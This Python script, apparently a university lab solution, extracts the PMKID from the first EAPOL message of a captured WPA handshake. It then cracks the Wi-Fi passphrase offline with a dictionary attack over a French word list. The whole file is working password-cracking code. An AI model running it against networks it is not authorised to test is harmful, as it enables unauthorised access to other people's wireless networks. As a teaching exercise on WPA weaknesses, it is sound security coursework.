#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

__maintainer__  = "Adrien Barth et Lionel Burgbacher"

from scapy.all import *
from scapy.layers.dot11 import Dot11AssoReq
from scapy.layers.eap import *
load_contrib("wpa_eapol")
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib


def catchAssociationRequest(packets):
    '''
    Cette fonction recherche une Association Request 802.11 et retourne le SSID avec les MAC AP/STA.
    '''
    for packet in packets:
        if packet.haslayer(Dot11AssoReq):
            ssid = packet.info.decode('UTF-8')
            ap_mac = packet.addr1.replace(':', '')
            sta_mac = packet.addr2.replace(':', '')
            return ssid, ap_mac, sta_mac
    return None, None, None


def catch4WayHandshake(ap_mac, sta_mac, packets):
    '''
    Cette fonction permet de retrouver les informations d'un 4-Way Handshake WPA.

    La contribution Scapy wpa_eapol permet d'analyser l'échange de clés WPA.
    https://scapy.readthedocs.io/en/latest/api/scapy.contrib.wpa_eapol.html

    Le champs 'key_info' permet de savoir
    - EAPOL-Key1 (ANonce)     = 138     AP -> STA
    - EAPOL-Key2 (SNonce+MIC) = 266     STA -> AP
    - EAPOL-Key3 (GTK+MIC)    = 5066    AP -> STA
    - EAPOL-Key4 (ACK)        = 778     STA -> AP

    L'algorithme de hash pour le calcul du MIC est donné par le champs descriptor_type:
    - 1 = HMAC-MD5-MIC
    - 2 = HMAC-SHA1-MIC (le MIC sera tronqué sur 32 bits)
    '''

    EAPOL_ANONCE = 138  # EAPOL-Key1(ANonce)

    for packet in packets:
        dst_mac = packet.addr1.replace(':', '')

        if packet.haslayer(WPA_key):
            wpa_key = packet.getlayer(WPA_key)

            # EAPOL-Key1(ANonce) / AP -> STA
            if (wpa_key.key_info == EAPOL_ANONCE) \
            and (dst_mac == sta_mac):
                #retourne la pmkid
                return (b2a_hex(wpa_key.wpa_key).decode('UTF-8'))[12:]
    
    return None

'''
Calculate PMKID
'''
def tryPmkid(passphrase, ssid, ap_mac, sta_mac):
    passphrase = str.encode(passphrase)
    pmk = pbkdf2(hashlib.sha1,passphrase, str.encode(ssid), 4096, 32)
    pmk_data = str.encode("PMK Name") + a2b_hex(ap_mac) + a2b_hex(sta_mac)
    pmkid = b2a_hex(hmac.new(pmk, pmk_data, hashlib.sha1).digest()[:16]).decode('UTF-8')
    return pmkid

'''
Try to found a WPA passphrase from a PMKID with a word list
'''
def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid, pathList):

    dico = open(pathList, 'r')
    for line in dico.readlines():
        for word in line.split():
            if pmkid == tryPmkid(word, ssid, APmac, Clientmac):
                return word
    return None

# Read capture file -- it contains beacon, authentication, association, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")
ssid, APmac, Clientmac = catchAssociationRequest(wpa)
pmkid = catch4WayHandshake(APmac, Clientmac, wpa)
passphrase = bruteForcePassphrase(ssid, APmac, Clientmac, pmkid, 'liste_francais.txt')

print ("\nBrute force attack")
print ("============================")
print ("SSID:\t\t", ssid)
print ("AP Mac:\t\t", APmac)
print ("Client Mac:\t", Clientmac)
print ("PMKID:\t\t", pmkid)
print ("Passphrase:\t", passphrase, "\n")


